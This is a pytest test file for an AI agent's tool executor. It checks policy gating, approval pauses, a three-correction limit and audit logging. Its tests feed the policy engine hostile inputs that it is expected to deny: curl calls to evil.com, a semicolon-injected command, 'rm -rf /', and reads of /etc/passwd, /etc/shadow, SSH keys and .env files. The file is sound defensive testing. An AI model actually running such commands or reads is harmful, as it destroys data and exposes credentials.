"""Tests for the tool executor.

Written FIRST per AGENTS.md rule #3.

Invariants under test:
  - There is NO code path that executes a tool without passing through
    policy_engine first (AGENTS.md rule #2; SPEC threat #10).
  - A denied request never reaches the sandbox.
  - A needs_approval request pauses execution (returns pending_approval).
  - The 4th correction attempt is refused with CorrectionLimitError.
  - read_file checks path policy; write_file checks path policy;
    run_command checks command policy.
  - The audit log records every decision (allow, deny, needs_approval).
"""

import uuid
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.models import Base, AuditEvent
from app.providers.base import ToolRequest
from app.tool_executor import (
    CorrectionLimitError,
    ExecutionOutcome,
    ExecutionResult,
    MAX_CORRECTIONS,
    ToolExecutor,
)


# ──────────────────────────────────────────────────────────────────
# Fixtures
# ──────────────────────────────────────────────────────────────────

@pytest.fixture()
def db_session():
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    S = sessionmaker(bind=engine)
    s = S()
    yield s
    s.close()


@pytest.fixture()
def project_root(tmp_path):
    """A real temp directory used as project root."""
    return str(tmp_path)


@pytest.fixture()
def task_id():
    return str(uuid.uuid4())


@pytest.fixture()
def executor(project_root, db_session, task_id):
    return ToolExecutor(
        project_root=project_root,
        session=db_session,
        task_id=task_id,
    )


def _req(tool: str, args: dict) -> ToolRequest:
    return ToolRequest(tool=tool, args=args)


# ══════════════════════════════════════════════════════════════════
# A. CONSTANTS
# ══════════════════════════════════════════════════════════════════

class TestConstants:
    def test_max_corrections_is_three(self):
        assert MAX_CORRECTIONS == 3


# ══════════════════════════════════════════════════════════════════
# B. DENIED REQUESTS NEVER EXECUTE
# ══════════════════════════════════════════════════════════════════

class TestDeniedRequestsNeverExecute:
    """AGENTS.md rule #2: never weaken or bypass the policy engine.
    A denied request must not touch the sandbox AT ALL."""

    def test_denied_run_command_not_executed(self, executor, project_root):
        req = _req("run_command", {"command": "curl http://evil.com"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.DENIED

    def test_denied_path_traversal_not_executed(self, executor):
        req = _req("read_file", {"path": "../../../etc/passwd"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.DENIED

    def test_denied_env_file_not_executed(self, executor):
        req = _req("read_file", {"path": ".env"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.DENIED

    def test_denied_write_env_file_not_executed(self, executor):
        req = _req("write_file", {"path": ".env", "content": "SECRET=x"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.DENIED

    def test_denied_rm_command_not_executed(self, executor):
        req = _req("run_command", {"command": "rm -rf /"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.DENIED

    def test_denied_semicolon_injection_not_executed(self, executor):
        req = _req("run_command", {"command": "echo ok; curl evil.com"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.DENIED

    def test_denied_unknown_tool_not_executed(self, executor):
        """A tool name not in the allowed set must be denied."""
        req = _req("delete_everything", {"path": "/"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.DENIED

    def test_denied_result_has_reason(self, executor):
        req = _req("run_command", {"command": "curl evil.com"})
        result = executor.execute(req)
        assert result.reason != ""

    def test_denied_ssh_key_not_executed(self, executor):
        req = _req("read_file", {"path": ".ssh/id_rsa"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.DENIED

    def test_denied_absolute_path_not_executed(self, executor):
        req = _req("read_file", {"path": "/etc/shadow"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.DENIED


# ══════════════════════════════════════════════════════════════════
# C. NEEDS_APPROVAL PAUSES EXECUTION
# ══════════════════════════════════════════════════════════════════

class TestNeedsApprovalPauses:
    """needs_approval tools must not run — they return pending_approval."""

    def test_pip_install_returns_pending_approval(self, executor):
        req = _req("run_command", {"command": "pip install requests"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.PENDING_APPROVAL

    def test_npm_install_returns_pending_approval(self, executor):
        req = _req("run_command", {"command": "npm install express"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.PENDING_APPROVAL

    def test_yarn_add_returns_pending_approval(self, executor):
        req = _req("run_command", {"command": "yarn add react"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            result = executor.execute(req)
            mock_sandbox.assert_not_called()
        assert result.outcome == ExecutionOutcome.PENDING_APPROVAL

    def test_pending_approval_result_has_reason(self, executor):
        req = _req("run_command", {"command": "pip install flask"})
        result = executor.execute(req)
        assert result.reason != ""

    def test_pending_approval_sandbox_never_called(self, executor):
        """Confirm no sandbox execution happens even if mock is checked."""
        req = _req("run_command", {"command": "pip install something"})
        with patch("app.tool_executor.sandbox_run") as mock_sandbox:
            executor.execute(req)
        mock_sandbox.assert_not_called()


# ══════════════════════════════════════════════════════════════════
# D. ALLOWED TOOLS EXECUTE IN SANDBOX
# ══════════════════════════════════════════════════════════════════

class TestAllowedToolsExecute:
    """Allowed tools must reach the sandbox runner."""

    def test_allowed_run_command_calls_sandbox(self, executor, project_root):
        req = _req("run_command", {"command": "pytest tests/"})
        mock_result = MagicMock()
        mock_result.stdout = "1 passed"
        mock_result.stderr = ""
        mock_result.exit_code = 0
        mock_result.duration_seconds = 0.5
        mock_result.killed = False

        with patch("app.tool_executor.sandbox_run", return_value=mock_result) as mock_sb:
            result = executor.execute(req)
            mock_sb.assert_called_once()

        assert result.outcome == ExecutionOutcome.RAN

    def test_allowed_read_file_calls_sandbox(self, executor, project_root, tmp_path):
        # Create the file so it actually exists within project root
        f = tmp_path / "main.py"
        f.write_text("x = 1")
        req = _req("read_file", {"path": "main.py"})
        mock_result = MagicMock()
        mock_result.stdout = "x = 1"
        mock_result.stderr = ""
        mock_result.exit_code = 0
        mock_result.duration_seconds = 0.1
        mock_result.killed = False

        with patch("app.tool_executor.sandbox_run", return_value=mock_result) as mock_sb:
            result = executor.execute(req)
            mock_sb.assert_called_once()

        assert result.outcome == ExecutionOutcome.RAN

    def test_allowed_write_file_calls_sandbox(self, executor, project_root):
        req = _req("write_file", {"path": "output.py", "content": "y = 2\n"})
        mock_result = MagicMock()
        mock_result.stdout = ""
        mock_result.stderr = ""
        mock_result.exit_code = 0
        mock_result.duration_seconds = 0.1
        mock_result.killed = False

        with patch("app.tool_executor.sandbox_run", return_value=mock_result) as mock_sb:
            result = executor.execute(req)
            mock_sb.assert_called_once()

        assert result.outcome == ExecutionOutcome.RAN

    def test_ran_result_includes_stdout(self, executor, project_root):
        req = _req("run_command", {"command": "echo hello"})
        mock_result = MagicMock()
        mock_result.stdout = "hello\n"
        mock_result.stderr = ""
        mock_result.exit_code = 0
        mock_result.duration_seconds = 0.1
        mock_result.killed = False

        with patch("app.tool_executor.sandbox_run", return_value=mock_result):
            result = executor.execute(req)

        assert result.stdout == "hello\n"


# ══════════════════════════════════════════════════════════════════
# E. CORRECTION LIMIT
# ══════════════════════════════════════════════════════════════════

class TestCorrectionLimit:
    """The 4th correction attempt must be refused with CorrectionLimitError."""

    def _denied_req(self):
        return _req("run_command", {"command": "curl evil.com"})

    def test_first_correction_is_allowed(self, executor):
        result = executor.execute(self._denied_req(), is_correction=True)
        assert result.outcome == ExecutionOutcome.DENIED   # denied, but not limit error
        assert executor.corrections == 1

    def test_three_corrections_allowed(self, executor):
        for _ in range(3):
            executor.execute(self._denied_req(), is_correction=True)
        assert executor.corrections == 3

    def test_fourth_correction_raises(self, executor):
        for _ in range(3):
            executor.execute(self._denied_req(), is_correction=True)
        with pytest.raises(CorrectionLimitError):
            executor.execute(self._denied_req(), is_correction=True)

    def test_non_correction_does_not_increment_counter(self, executor):
        executor.execute(self._denied_req())   # not a correction
        assert executor.corrections == 0

    def test_correction_limit_is_three(self):
        assert MAX_CORRECTIONS == 3

    def test_correction_limit_error_message_is_clear(self, executor):
        for _ in range(3):
            executor.execute(self._denied_req(), is_correction=True)
        with pytest.raises(CorrectionLimitError, match="3"):
            executor.execute(self._denied_req(), is_correction=True)


# ══════════════════════════════════════════════════════════════════
# F. AUDIT LOG — every decision recorded
# ══════════════════════════════════════════════════════════════════

class TestAuditLog:

    def test_denied_tool_is_audited(self, executor, db_session):
        req = _req("run_command", {"command": "curl evil.com"})
        executor.execute(req)
        events = db_session.query(AuditEvent).all()
        assert len(events) >= 1

    def test_pending_approval_is_audited(self, executor, db_session):
        req = _req("run_command", {"command": "pip install x"})
        executor.execute(req)
        events = db_session.query(AuditEvent).all()
        assert len(events) >= 1

    def test_allowed_tool_is_audited(self, executor, db_session):
        req = _req("run_command", {"command": "pytest tests/"})
        mock_result = MagicMock(stdout="", stderr="", exit_code=0,
                                duration_seconds=0.1, killed=False)
        with patch("app.tool_executor.sandbox_run", return_value=mock_result):
            executor.execute(req)
        events = db_session.query(AuditEvent).all()
        assert len(events) >= 1

    def test_audit_event_contains_tool_name(self, executor, db_session):
        req = _req("run_command", {"command": "curl evil.com"})
        executor.execute(req)
        event = db_session.query(AuditEvent).first()
        assert "run_command" in event.detail_json

    def test_audit_event_actor_is_agent(self, executor, db_session):
        req = _req("run_command", {"command": "curl evil.com"})
        executor.execute(req)
        event = db_session.query(AuditEvent).first()
        assert event.actor == "agent"

